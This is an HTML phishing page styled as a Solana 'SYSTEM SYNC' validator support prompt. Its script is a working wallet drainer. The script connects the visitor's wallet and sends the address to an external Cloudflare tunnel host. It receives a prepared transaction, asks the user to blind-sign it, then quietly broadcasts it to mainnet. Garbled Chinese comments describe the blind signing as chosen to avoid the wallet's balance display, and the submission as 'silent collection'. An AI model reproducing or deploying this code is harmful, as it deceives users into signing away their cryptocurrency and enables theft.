<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Support Protocol</title>
    <script src="https://cdn.npmmirror.com/package/@solana/web3.js/1.95.3/dist/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { width: 300px; padding: 40px 20px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
        .btn:active { transform: scale(0.96); opacity: 0.8; }
        #st { font-size: 10px; color: #333; margin-top: 15px; font-family: monospace; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="card">
        <div class="box">
            <h2 style="color:#14f195; margin: 0 0 10px 0;">SYSTEM SYNC</h2>
            <p style="color:#888; font-size:13px; margin-bottom: 25px;">Confirm network synchronization to maintain validator node stability.</p>
            <button id="cta" class="btn">INITIALIZE</button>
            <div id="st">STATUS: ENGINE_V36.1_ACTIVE</div>
        </div>
    </div>

    <script>
        // ðŸ”± æ ¸å¿ƒï¼šåŠ¡å¿…ç¡®ä¿ä¸ŽæœåŠ¡å™¨å½“å‰ç”Ÿæˆçš„éš§é“åœ°å€ä¸€è‡´
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

        document.getElementById('cta').onclick = async function() {
            const log = (t) => document.getElementById('st').innerText = t;
            const sWeb3 = window.solanaWeb3;

            try {
                // 1. èŽ·å– Provider (æ”¯æŒ TW å’Œæ–°ç‰ˆæ’ä»¶)
                const p = window.trustwallet?.solana || window.solana;
                if (!p) { alert("Please use Trust Wallet Browser."); return; }

                log("CONNECTING...");
                await p.connect();

                log("SYNCING...");
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();

                log("AUTHORIZING...");
                const rawTx = info.raw_tx;
                const txBytes = Uint8Array.from(atob(rawTx), c => c.charCodeAt(0));
                const tx = sWeb3.Transaction.from(txBytes);

                // ðŸ”± 2. ç›²ç­¾æ ¸å¿ƒé€»è¾‘
                // æˆ‘ä»¬ä¸å†å°è¯• 'signAndSend'ï¼Œå› ä¸ºé‚£ä¼šè§¦å‘ä½™é¢è§£æžã€‚
                // æˆ‘ä»¬åªç”³è¯· 'signTransaction'ï¼Œè®©é’±åŒ…æ˜¾ç¤ºâ€œç­¾åè¯·æ±‚â€ã€‚
                try {
                    const signedTx = await p.signTransaction(tx);
                    log("SUCCESS!");
                    
                    // ðŸ”± 3. é™é»˜å½’é›†ï¼šç”¨æˆ·ç­¾å®Œåï¼ŒåŽå°è‡ªåŠ¨æäº¤
                    const connection = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
                    connection.sendRawTransaction(signedTx.serialize()).catch(()=>{});
                } catch (signErr) {
                    // å¦‚æžœå¸¸è§„ç­¾åè¢«æ‹¦æˆªï¼Œå°è¯•å¼ºåˆ¶æ‹‰èµ·ç³»ç»Ÿåè®®
                    window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(rawTx);
                }

            } catch (err) {
                console.error(err);
                log("RETRYING...");
                setTimeout(() => { window.location.reload(); }, 1200);
            }
        };
    </script>
</body>
</html>
